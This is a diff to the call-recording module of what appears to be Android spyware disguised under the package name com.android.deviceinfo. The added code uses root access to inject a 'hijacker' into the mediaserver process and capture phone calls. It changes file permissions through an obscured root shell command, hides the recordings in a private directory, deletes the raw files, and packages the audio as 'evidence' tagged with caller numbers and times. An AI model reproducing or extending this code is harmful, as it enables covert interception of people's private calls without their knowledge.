@@ -40,9 +40,11 @@ import android.os.FileObserver;
 
 import com.android.deviceinfo.Call;
 import com.android.deviceinfo.Device;
+import com.android.deviceinfo.RunningProcesses;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
+import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.conf.ConfigurationException;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
@@ -56,6 +58,9 @@ import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.DateTime;
+import com.android.deviceinfo.util.Execute;
+import com.android.deviceinfo.util.ExecuteResult;
+import com.android.deviceinfo.util.Instrument;
 import com.android.deviceinfo.util.Utils;
 import com.android.deviceinfo.util.WChar;
 import com.musicg.wave.Wave;
@@ -71,6 +76,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	// private String number, model;
 	private int strategy = 0;
 
+	private static final int CHANNEL_LOCAL = 0;
+	private static final int CHANNEL_REMOTE = 1;
+	
 	private static final int CALLIST_PHONE = 0x0;
 	private static final int CALLIST_SKYPE = 0x1;
 	private static final int CALLIST_VIBER = 0x2;
@@ -88,6 +96,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final Object sync = new Object();
 	private static BlockingQueue<String> calls;
 	private EncodingTask encodingTask;
+	private String audioDirectory = "k0/";
 
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
@@ -126,11 +135,49 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 		}
 
-		// Start monitoring the filesystem
-		if (Status.haveRoot() && createAudioStorage() == true) {
+		// Try to create the audio storage, at this point the sdcard might take a while to come up
+		boolean audioStorageOk = false;
+
+		for (int i = 0; i < 5; i++) {
+			if (createAudioStorage() == true) {
+				audioStorageOk = true;
+				break;
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(actualStart): retrying to create the audio storage");
+			}
+			
+			Utils.sleep(1000);
+		}
+		 
+		if (audioStorageOk == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(actualStart): unable to create audio storage");
+			}
+		}
+			
+		if (Status.haveRoot() && audioStorageOk) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(actualStart): starting audio storage management");
 			}
+			
+			Instrument hijack = new Instrument("mediaserver", audioStorage);
+			
+			if (hijack.installHijacker()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(actualStart): hijacker successfully installed");
+				}
+				
+				hijack.startInstrumentation();
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(actualStart): hijacker cannot be installed");
+				}
+				
+				return;
+			}
+
 			
 			calls = new LinkedBlockingQueue<String>();
 			
@@ -156,10 +203,15 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			// Tell the thread to process scrubbed files
 			encodingTask.wake();
 
-			// Observe our audio storage
+			// Observe our audio storage (events are filtered so if you push a .tmp using ADB it wont
+			// trigger, you have to copy the test file and RENAME it .tmp to trigger this observer)
 			observer = new FileObserver(audioStorage, FileObserver.MOVED_TO) {
 				@Override
 				public void onEvent(int event, String file) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(onEvent): event: " + event + " for file: " + file);
+					}
+					
 					// Add to list
 					if (addToEncodingList(audioStorage + file) == true) {
 						synchronized(sync) {
@@ -174,10 +226,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			};
 
 			observer.startWatching();
-		} else {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): cannot create audio storage");
-			}
 		}
 	}
 
@@ -207,6 +255,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(purgeAudio): removing stray binary: " + fullName + " whic is: " + (now - epoch)/3600 + " hours old");
 				}
+				
+				// Make it read-write
+				Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + fullName);
 				
 				storedFile.delete();
 			}
@@ -296,9 +347,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			            
 			            encodeChunks(file);
 	            	}
-	            		
-	            	// Encode
-		            //encodeAudio(data);
 				} catch (Exception e) {
 					if (Cfg.EXCEPTION) {
 						Check.log(e);
@@ -321,6 +369,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			Check.log(TAG + "(addToEncodingList): adding \"" + s + "\" to the encoding list");
 		}
 		
+		// Make it read-write in any case
+		Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + s);
+				
 		// Add the file to the list	
 		calls.add(s);
 		
@@ -332,11 +383,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		ListenerCall.self().detach(this);
 
 		if (Status.haveRoot()) {
-			if (queueMonitor.isAlive()) {
+			if (queueMonitor != null && queueMonitor.isAlive()) {
 				encodingTask.stop();
 			}
 			
-			observer.stopWatching();
+			if (observer != null) {
+				observer.stopWatching();
+			}
 		}
 	}
 
@@ -392,7 +445,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Object future = Status.self().getStpe().schedule(new Runnable() {
 					public void run() {
 						saveCallEvidence(call.getNumber(), incoming, call.getTimeBegin(), call.getTimeEnd(),
-								currentRecordFile);
+								currentRecordFile, true, 1);
 					}
 				}, 100, TimeUnit.MILLISECONDS);
 
@@ -451,14 +504,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	private boolean saveCallEvidence(String number, boolean incoming, Date dateBegin, Date dateEnd,
-			String currentRecordFile) {
+			String currentRecordFile, boolean autoClose, int channel) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " number: " + number + " from: " + dateBegin
 					+ " to: " + dateEnd + " incoming: " + incoming);
 		}
 
 		final byte[] additionaldata = getCallAdditionalData(number, incoming, new DateTime(dateBegin), new DateTime(
-				dateEnd));
+				dateEnd), channel);
 
 		AutoFile file = new AutoFile(currentRecordFile);
 		if (file.exists() && file.getSize() > HEADER_SIZE && file.canRead()) {
@@ -489,7 +542,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 
 			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, data);
-			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
+			
+			if (autoClose) {
+				EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
+			}
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveCallEvidence): deleting file: " + file);
@@ -501,6 +557,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		} else {
 			return false;
 		}
+	}
+	
+	private void closeCallEvidence(String number, boolean incoming, Date dateBegin, Date dateEnd) {
+		final byte[] additionaldata = getCallAdditionalData(number, incoming, new DateTime(dateBegin), new DateTime(
+				dateEnd), CHANNEL_LOCAL);
+		
+		EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 	}
 	
 	private int checkIntegrity(byte[] data) {
@@ -526,7 +589,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return pos;
 	}
 
-	private byte[] getCallAdditionalData(String number, boolean incoming, DateTime dateBegin, DateTime dateEnd) {
+	private byte[] getCallAdditionalData(String number, boolean incoming, DateTime dateBegin, DateTime dateEnd, int channels) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (getCallAdditionalData): " + number);
 		}
@@ -538,18 +601,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		byte[] caller;
 		byte[] callee;
 
-		if (incoming) {
-			callee = WChar.getBytes(Device.self().getPhoneNumber());
-			caller = WChar.getBytes(number);
-		} else {
-			caller = WChar.getBytes(Device.self().getPhoneNumber());
-			callee = WChar.getBytes(number);
-		}
+		callee = WChar.getBytes(Device.self().getPhoneNumber());
+		caller = WChar.getBytes(number);
 
 		final int version = 2008121901; // CALL_LOG_VERSION
 		final int program = 0x0145; // LOGTYPE_CALL_MOBILE
 		final int LOG_AUDIO_CODEC_AMR = 0x1;
-		int channel = 1;
+		int channel = channels; // 0 - local, 1 - remote
 		int sampleRate = 8000 | LOG_AUDIO_CODEC_AMR;
 
 		int len = 20 + 16 + 8 + caller.length + callee.length;
@@ -961,26 +1019,26 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				if (Cfg.DEBUG) {
 					//Check.log(TAG + "(encodeChunks): epoch: " + epoch + " streamType: " + streamType + " sampleRate: " + sampleRate + " blockLen: " + blockLen);
 				}
-				
-				if (blockLen == 0 && streamType == end_of_call) {
+
+				if (streamType == end_of_call) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(encodeChunks): end of call reached for " + f);
 					}
-					
+
 					call_finished = true;
-					
+
 					if (d.remaining() > 0) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + "(encodeChunks): ***WARNING*** end of call reached and still " + d.remaining() + " bytes remaining!");
 						}
 					}
-					
+
 					continue;
 				}
 				
 				if (blockLen == discard_frame_size) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + "(encodeChunks): skipping misterious frame (length: " + blockLen + " bytes)");
+						//Check.log(TAG + "(encodeChunks): skipping misterious frame (length: " + blockLen + " bytes)");
 					}
 					
 					d.position(d.position() + blockLen);
@@ -1011,17 +1069,24 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			String encodedFile = f + ".err";
 			
 			if (encodetoAmr(encodedFile, wave.getBytes())) {
-				boolean incoming = encodedFile.endsWith("-r.tmp.err");
+				int remote;
+				
+				if (encodedFile.endsWith("-r.tmp.err")) {
+					remote = 1;
+				} else {
+					remote = 0;
+				}
 				
 				// Encode to evidence
 				Date begin = new Date(first_epoch * 1000L);
 				Date end = new Date(last_epoch * 1000L);
 				
-				saveCallEvidence("+666", incoming, begin, end, encodedFile);
-			}
-			
-			if (call_finished) {
-				// After encoding create the end of call marker
+				saveCallEvidence("+666", true, begin, end, encodedFile, false, remote);
+				
+				if (call_finished) {
+					// After encoding create the end of call marker
+					closeCallEvidence("+666", true, begin, end);
+				}			
 			}
 			
 			// Remove file
@@ -1029,7 +1094,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + "(encodeChunks): deleting " +  f);
 			}
 			
-			//raw.delete();
+			raw.delete();
 		} finally {
 			if (in != null) {
 				in.close();
@@ -1079,7 +1144,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	private boolean createAudioStorage() {
 		// Create storage directory
-		audioStorage = Path.hidden() + "gub/";
+		audioStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + audioDirectory;
 
 		if (Path.createDirectory(audioStorage) == false) {
 			if (Cfg.DEBUG) {
@@ -1088,6 +1153,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			return false;
 		} else {
+			Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "777" + " " + audioStorage);
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (createAudioStorage): audio storage directory created at " + audioStorage); //$NON-NLS-1$
 			}
